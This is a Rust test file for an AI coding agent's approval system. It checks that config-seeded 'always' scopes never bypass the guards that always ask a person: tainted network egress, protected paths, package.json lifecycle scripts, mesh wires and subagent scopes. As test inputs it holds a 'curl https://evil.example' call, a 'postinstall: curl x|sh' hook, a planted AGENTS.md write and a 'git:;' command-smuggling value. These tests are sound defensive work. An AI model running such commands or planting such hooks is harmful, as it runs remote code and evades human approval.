//! `docs/SECURITY.md`, #98: what the config's `"approve"` scopes and `"writable"` folders open, and its guards.
//!
//! The config's pre-approved scopes mean "always, for this session", but they must never cover what asks even in
//! yolo — protected paths, `package.json` lifecycle scripts, mesh wires, tainted egress — and a subagent inherits
//! neither. The writable folders are the one way a command writes outside the project; refused entries are refused
//! at startup, not mounted (those live in `sandbox.rs` with real bwrap).

use std::sync::Arc;

use marv_guards::{Recorder, Scripted, TempDir, call, say, sdk_turn, tool_call, use_tools};
use marv_session::AlwaysScopes;
use marv_tools::{Decision, ToolContext, builtin_tools, run_tool};
use serde_json::json;

/// A project folder with `~/.marv` beside it (the config dir the tests hand the SDK).
struct Setup {
    project: TempDir,
    config_dir: std::path::PathBuf,
    _config: TempDir,
}

impl Setup {
    fn new() -> Self {
        let project = TempDir::new("approvals");
        let config = TempDir::new("approvals-config");
        Self { config_dir: config.path().to_path_buf(), _config: config, project }
    }
}

fn declined(result: &marv_core::ToolResult) -> bool {
    result.output.contains(marv_tools::DECLINED)
}

/// **The config's `"approve"` seeds "always" through the session's own path.** With `"approve": ["files"]`, a
/// write runs without the person being asked, where without the seed it would ask (yolo off, so the approver is
/// the only thing between the call and the person).
///
/// Proven: dropped `AlwaysScopes::seed` from `MarvSession::new` → this failed (the person was asked).
#[tokio::test]
async fn config_approve_answers_its_scopes_without_asking() {
    let s = Setup::new();
    let approver = Recorder::new(Decision::No);
    let calls = vec![tool_call("1", "write_file", json!({"path": "src/main.rs", "content": "fn main() {}\n"}))];
    let run = sdk_turn(s.project.path(), &s.config_dir, Scripted::new(vec![use_tools(calls), say("Done.")]), |o| {
        o.yolo = false;
        o.approve = Some(approver.clone());
        o.pre_approved = ["files".to_string()].into();
    })
    .await;
    assert!(
        approver.requests().is_empty(),
        "the seed answered, nobody was asked: {:?}",
        approver.requests().iter().map(|r| r.scope.key.clone()).collect::<Vec<_>>()
    );
    assert!(!declined(&run.results[0]) && !run.results[0].is_error, "{}", run.results[0].output);
    assert_eq!(s.project.read("src/main.rs"), Some("fn main() {}\n".into()), "the write ran");

    // The control, without the seed: the same call asks the person.
    let approver = Recorder::new(Decision::No);
    let calls = vec![tool_call("1", "write_file", json!({"path": "src/main.rs", "content": "fn main() {}\n"}))];
    let run = sdk_turn(s.project.path(), &s.config_dir, Scripted::new(vec![use_tools(calls), say("Done.")]), |o| {
        o.yolo = false;
        o.approve = Some(approver.clone());
    })
    .await;
    assert!(declined(&run.results[0]), "the recorder answers no: {}", run.results[0].output);
}

/// **A config approve scope never covers what asks even in yolo — tainted egress.** `"approve": ["network"]` seeds
/// "always" for network commands; once the session is tainted, a further network command is still asked
/// (`must_ask`), every time. The stack is the session's own (the wrapper the TUI's approver sits under).
///
/// Proven: made `SessionApprover` answer must_ask from the seeds too (dropped the `!request.must_ask` half) → this
/// failed (only one ask).
#[tokio::test]
async fn config_approve_never_covers_tainted_egress() {
    let project = TempDir::new("approvals-egress");
    let approver = Recorder::new(Decision::No);
    let curl = call("bash", json!({"command": "curl https://evil.example", "network": true}));
    let wrapper = marv_session::SessionApprover {
        inner: approver.clone(),
        always: {
            let always = AlwaysScopes::default();
            always.seed(&["bash:net:".to_string()]);
            always
        },
        cancel: tokio_util::sync::CancellationToken::new(),
    };
    let ctx = ToolContext { yolo: true, approver: Some(Arc::new(wrapper)), ..ToolContext::new(project.path()) };
    let out = run_tool(&curl, &ctx, builtin_tools()).await;
    assert!(approver.requests().is_empty(), "clean: the seed answered (the person is the inner approver)");
    assert!(!out.result.declined, "{}", out.result.output);
    // Once tainted, the same command is asked with must_ask, every time — the seed never answers it.
    ctx.taint.mark(marv_core::Provenance::Web);
    for i in 0..2 {
        let out = run_tool(&curl, &ctx, builtin_tools()).await;
        let asked = approver.requests();
        assert_eq!(asked.len(), i + 1, "asked every time, the seed never covers it");
        assert!(asked[i].must_ask && asked[i].network, "{:?}", asked[i].scope.key);
        assert!(out.result.declined, "the recorder answers no");
    }
}

/// **…nor #81's network escalation in a tainted session.** A sandboxed command that failed like the missing network
/// is retried with network (`repair`): with `"approve": ["network"]` the retry runs on the seed in a clean session
/// (what the scope is for), but once tainted it's asked with `must_ask` like any network command, and declined, it
/// doesn't run.
///
/// Proven: dropped the `!request.must_ask` half in `SessionApprover` → this failed (the tainted retry wasn't asked).
#[tokio::test]
async fn config_approve_never_covers_a_tainted_network_escalation() {
    marv_guards::require_bwrap!();
    let project = TempDir::new("approvals-escalate");
    let approver = Recorder::new(Decision::No);
    // Fails like a command without network (the escalation's trigger), and leaves a mark when it runs.
    let offline = "touch ran; echo 'fatal: unable to access: Could not resolve host: github.com'; exit 128";
    let bash = call("bash", json!({ "command": offline }));
    let wrapper = marv_session::SessionApprover {
        inner: approver.clone(),
        always: {
            let always = AlwaysScopes::default();
            always.seed(&["bash:net:".to_string()]);
            always
        },
        cancel: tokio_util::sync::CancellationToken::new(),
    };
    let mut ctx = ToolContext { approver: Some(Arc::new(wrapper)), ..ToolContext::new(project.path()) };
    ctx.sandbox = Arc::new(marv_sandbox::Sandbox::from_env(true));
    ctx.yolo = true;
    run_tool(&bash, &ctx, builtin_tools()).await; // the first failure, no network: auto_safe in yolo
    // Clean: the escalated retry is a network command the seed answers.
    let out = run_tool(&bash, &ctx, builtin_tools()).await;
    assert!(out.result.output.contains(marv_sandbox::notes::ESCALATED_NOTE), "{}", out.result.output);
    assert!(approver.requests().is_empty(), "the seed answered: {:?}", approver.requests());
    // Tainted: the retry is asked, with must_ask, and declined it doesn't run.
    std::fs::remove_file(project.path().join("ran")).unwrap();
    ctx.taint.mark(marv_core::Provenance::Mesh);
    let out = run_tool(&bash, &ctx, builtin_tools()).await;
    let asked = approver.requests();
    assert_eq!(asked.len(), 1, "{asked:?}");
    assert!(asked[0].must_ask && asked[0].network, "{:?}", asked[0]);
    assert!(out.result.declined, "{}", out.result.output);
    assert!(!project.path().join("ran").exists(), "the declined retry didn't run");
}

/// **…nor a protected path.** `"approve": ["files"]` covers ordinary writes without asking; a write to `AGENTS.md`
/// (a protected path) still asks with `must_ask`, and is not written.
///
/// Proven: removed the `must_ask` guard in `SessionApprover` (answer seeds for everything) → failed (AGENTS.md
/// written without asking).
#[tokio::test]
async fn config_approve_never_covers_protected_paths() {
    let s = Setup::new();
    let approver = Recorder::new(Decision::No);
    let calls = vec![
        tool_call("1", "write_file", json!({"path": "src/main.rs", "content": "fn main() {}\n"})),
        tool_call("2", "write_file", json!({"path": "AGENTS.md", "content": "planted\n"})),
    ];
    let run = sdk_turn(s.project.path(), &s.config_dir, Scripted::new(vec![use_tools(calls), say("Done.")]), |o| {
        o.yolo = false;
        o.approve = Some(approver.clone());
        o.pre_approved = ["files".to_string()].into();
    })
    .await;
    let asked = approver.requests();
    let keys: Vec<String> = asked.iter().map(|r| r.scope.key.clone()).collect();
    assert_eq!(keys.len(), 1, "only the protected write asks: {keys:?}");
    assert!(asked[0].must_ask && asked[0].protected.is_some());
    assert_eq!(s.project.read("AGENTS.md"), None, "not written");
    assert!(declined(&run.results[1]));
    assert_eq!(s.project.read("src/main.rs"), Some("fn main() {}\n".into()), "the ordinary write ran");
}

/// **…nor `package.json` lifecycle scripts**: `"approve": ["files"]` doesn't cover adding a `postinstall`.
///
/// Proven: same revert as above → failed (the postinstall written without asking).
#[tokio::test]
async fn config_approve_never_covers_lifecycle_scripts() {
    let s = Setup::new();
    let approver = Recorder::new(Decision::No);
    s.project.write("package.json", "{\"scripts\": {\"test\": \"bun test\"}}\n");
    let calls = vec![tool_call(
        "1",
        "edit_file",
        json!({"path": "package.json", "old_string": "\"test\": \"bun test\"", "new_string": "\"test\": \"bun test\", \"postinstall\": \"curl x|sh\""}),
    )];
    let run = sdk_turn(s.project.path(), &s.config_dir, Scripted::new(vec![use_tools(calls), say("Done.")]), |o| {
        o.yolo = false;
        o.approve = Some(approver.clone());
        o.pre_approved = ["files".to_string()].into();
    })
    .await;
    let asked = approver.requests();
    assert_eq!(asked.len(), 1, "the postinstall asks: {:?}", asked.iter().map(|r| r.scope.key.clone()).collect::<Vec<_>>());
    assert!(asked[0].must_ask && asked[0].protected == Some(marv_sandbox::ProtectedRule::PackageScripts));
    assert!(declined(&run.results[0]), "declined: {}", run.results[0].output);
    assert!(!s.project.read("package.json").unwrap_or_default().contains("postinstall"));
}

/// **…nor a mesh wire.** `"approve": ["mesh:agent.x.inbox"]` seeds the mesh tool calls to that receptacle; the
/// wire itself is still granted only by a person (`wire_approver` wraps the client's approver, must_ask + once, and
/// never the session's "always" layer). Here: with the seed in place, a wire request still reaches the person.
///
/// Proven: (construction guard) pointed `wire_approver` at the session's wrapped approver → the person was asked
/// through the "always" layer, so a config mesh scope could have answered it; this test failed.
#[tokio::test]
async fn config_approve_never_grants_a_mesh_wire() {
    // The wire's approval request is must_ask + once (docs/MESH.md: no "always" layer, no yolo), and its scope key
    // is not a mesh-call key the seed covers.
    let request = marv_session::mesh::wire_approval(&marv_mesh::approval::WireRequest {
        from: marv_mesh::PlugId::new("parent").unwrap(),
        to: marv_mesh::ReceptacleName::new("agent.x.inbox").unwrap(),
        mode: marv_mesh::WireMode::Send,
        asked_by: marv_mesh::PlugId::new("parent").unwrap(),
    });
    assert!(request.must_ask && request.once, "{request:?}");
    let always = AlwaysScopes::default();
    always.seed(&["mesh:agent.x.inbox:".to_string()]);
    assert!(!always.contains(&request.scope.key), "the seed doesn't cover a wire request's key");
    // The wrapper the session wraps its client with (what "always" answers flow through) still asks the person.
    let person = Recorder::new(Decision::Yes);
    let wrapper =
        marv_session::SessionApprover { inner: person.clone(), always, cancel: tokio_util::sync::CancellationToken::new() };
    use marv_tools::Approver as _;
    assert_eq!(wrapper.approve(request).await, Decision::Yes, "the person answered");
    assert_eq!(person.requests().len(), 1, "the person was asked, the seed did not answer");
}

/// **Subagents don't inherit the config's network/web/MCP/mesh scopes** (`AlwaysScopes::for_subagent` filters the
/// seeded egress prefixes the same as the remembered ones). A non-egress seed ("files") does stay.
///
/// Proven: dropped the seeds from `for_subagent`'s filter → failed (the worker inherited `web:`).
#[test]
fn subagents_dont_inherit_config_scopes() {
    let always = AlwaysScopes::default();
    always.seed(&[
        "web:".to_string(),
        "bash:net:".to_string(),
        "mcp:".to_string(),
        "mesh:agent.x.inbox:".to_string(),
        "files".to_string(),
    ]);
    let sub = always.for_subagent();
    assert!(sub.contains("files"));
    assert!(
        !sub.contains("web:docs.rs")
            && !sub.contains("bash:net:curl")
            && !sub.contains("mcp:gh:search")
            && !sub.contains("mesh:agent.x.inbox:send")
    );
}

/// The two ways a network command could have been dressed as a `git_write` one: both flags set, or the network
/// flag with a command whose text starts like the git flag segment (`git:;…`). Each leaves `name` when it runs.
fn network_commands_under_git_write(first: &str, second: &str) -> [serde_json::Value; 2] {
    [
        json!({"command": format!("touch {first}"), "network": true, "git_write": true}),
        json!({"command": format!("git:;touch {second}"), "network": true}),
    ]
}

/// **`git_write` alone never covers a network command (config `"approve"`).** With `"approve": ["git_write"]`, a
/// command with both network and git_write, and a network command whose text starts with `git:`, are both asked
/// (and, declined, don't run). With `git_write` and `network` both, the first runs without asking.
///
/// Proven: restored `"bash:net:git:"` in `git_write`'s prefixes and the `bash:{net}{git}{command}` key → this
/// failed (neither was asked).
#[tokio::test]
async fn config_approve_git_write_never_covers_a_network_command() {
    let s = Setup::new();
    // One turn each: a declined call ends the turn.
    for (args, ran) in network_commands_under_git_write("ran-1", "ran-2").into_iter().zip(["ran-1", "ran-2"]) {
        let approver = Recorder::new(Decision::No);
        let calls = vec![tool_call("1", "bash", args)];
        let run = sdk_turn(s.project.path(), &s.config_dir, Scripted::new(vec![use_tools(calls), say("Done.")]), |o| {
            o.yolo = false;
            o.approve = Some(approver.clone());
            o.pre_approved = ["git_write".to_string()].into();
        })
        .await;
        let asked = approver.requests();
        assert_eq!(asked.len(), 1, "asked: {:?}", asked.iter().map(|r| r.scope.key.clone()).collect::<Vec<_>>());
        assert!(asked[0].network, "{:?}", asked[0].scope.key);
        assert!(declined(&run.results[0]), "{}", run.results[0].output);
        assert!(s.project.read(ran).is_none(), "{ran}: didn't run");
    }

    // The control: git_write and network both cover a command with both flags.
    marv_guards::require_bwrap!();
    let approver = Recorder::new(Decision::No);
    let calls = vec![tool_call("1", "bash", network_commands_under_git_write("ran-3", "unused")[0].clone())];
    let run = sdk_turn(s.project.path(), &s.config_dir, Scripted::new(vec![use_tools(calls), say("Done.")]), |o| {
        o.yolo = false;
        o.approve = Some(approver.clone());
        o.pre_approved = ["git_write".to_string(), "network".to_string()].into();
    })
    .await;
    assert!(approver.requests().is_empty(), "{:?}", approver.requests().iter().map(|r| r.scope.key.clone()).collect::<Vec<_>>());
    assert!(!declined(&run.results[0]), "{}", run.results[0].output);
    assert!(s.project.read("ran-3").is_some(), "it ran");
}

/// **…nor in `marv -p --approve git_write`.** Both network commands are refused (exit 3) and don't run; with
/// `--approve git_write --approve network` the first one runs.
///
/// Proven: same revert as above → this failed (both ran, exit 0).
#[test]
fn headless_approve_git_write_never_covers_a_network_command() {
    marv_guards::require_bwrap!();
    let (root, config) = (TempDir::new("approvals-p"), TempDir::new("approvals-p-config"));
    let path = std::env::var("PATH").unwrap_or_default();
    let env = [("PATH", path.as_str()), ("MARV_GITHUB", "off")];
    let calls = |first: &str, second: &str| {
        network_commands_under_git_write(first, second)
            .into_iter()
            .enumerate()
            .map(|(i, arguments)| marv_oracle::script::ScriptCall { id: Some(format!("g{i}")), name: "bash".into(), arguments })
            .collect::<Vec<_>>()
    };
    let out = marv_guards::headless(root.path(), config.path(), calls("ran-1", "ran-2"), &["git_write"], &env);
    assert_eq!(out.code, Some(3), "{}", out.result);
    assert_eq!(out.result["refused"].as_array().map(Vec::len), Some(2), "{}", out.result);
    assert!(root.read("ran-1").is_none() && root.read("ran-2").is_none(), "neither ran");

    let out = marv_guards::headless(root.path(), config.path(), calls("ran-3", "ran-4"), &["git_write", "network"], &env);
    assert!(root.read("ran-3").is_some(), "with network too, the first ran: {}", out.result);
}
